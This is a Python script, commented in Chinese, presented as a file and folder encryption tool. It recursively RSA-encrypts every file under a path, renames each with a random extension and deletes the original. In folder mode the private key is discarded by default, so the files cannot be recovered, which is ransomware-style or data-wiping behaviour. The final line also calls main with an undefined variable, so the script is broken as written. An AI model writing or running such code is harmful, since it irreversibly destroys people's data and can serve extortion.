
import os
import sys
import random
import string
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def generate_random_suffix(length=3):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def encrypt_file(file_path, private_key_path="private_key.pem"):
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    cipher = PKCS1_OAEP.new(RSA.import_key(public_key))
    max_block_size = (key.size_in_bytes() - 42)
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_chunks = []
        for i in range(0, len(data), max_block_size):
            chunk = data[i:i + max_block_size]
            encrypted_chunk = cipher.encrypt(chunk)
            encrypted_chunks.append(encrypted_chunk)
        encrypted_data = b''.join(encrypted_chunks)
        random_suffix = generate_random_suffix()
        new_file_path = f"{file_path}.{random_suffix}"
        with open(new_file_path, 'wb') as f:
            f.write(encrypted_data)
        os.remove(file_path)
        print(f"文件 '{file_path}' 已加密为 '{new_file_path}'")
        with open(private_key_path, 'wb') as f:
            f.write(private_key)
        print(f"私钥已保存到: {os.path.abspath(private_key_path)}")
    except PermissionError:
        print(f"跳过文件 '{file_path}'，没有权限访问")
    except Exception as e:
        print(f"跳过文件 '{file_path}'，加密时出现错误: {e}")

def encrypt_folder(folder_path):
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    cipher = PKCS1_OAEP.new(RSA.import_key(public_key))
    max_block_size = (key.size_in_bytes() - 42)
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, 'rb') as f:
                    data = f.read()
                encrypted_chunks = []
                for i in range(0, len(data), max_block_size):
                    chunk = data[i:i + max_block_size]
                    encrypted_chunk = cipher.encrypt(chunk)
                    encrypted_chunks.append(encrypted_chunk)
                encrypted_data = b''.join(encrypted_chunks)
                random_suffix = generate_random_suffix()
                new_file_path = f"{file_path}.{random_suffix}"
                with open(new_file_path, 'wb') as f:
                    f.write(encrypted_data)
                os.remove(file_path)
                print(f"文件 '{file_path}' 已加密为 '{new_file_path}'")
            except PermissionError:
                print(f"跳过文件 '{file_path}'，没有权限访问")
            except Exception as e:
                print(f"跳过文件 '{file_path}'，加密时出现错误: {e}")
    #需要密钥就删除符号 '#'
    #private_key_path = os.path.join(folder_path, "private_key.pem")
    #with open(private_key_path, 'wb') as f:
    #    f.write(private_key)
    #print(f"私钥已保存到: {private_key_path}")

def main(target_path):
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{'-' * 50}\n\t\t文件/文件夹加密工具\n{'-' * 50}")
    if not os.path.exists(target_path):
        print(f"路径不存在: {target_path}")
        sys.exit()
    if os.path.isfile(target_path):
        encrypt_file(target_path)
    elif os.path.isdir(target_path):
        encrypt_folder(target_path)
    else:
        print("无效的路径类型！")
    print(f"{'-' * 50}\n\t\t操作完成！\n{'-' * 50}")

if __name__ == "__main__":
    main(target_path)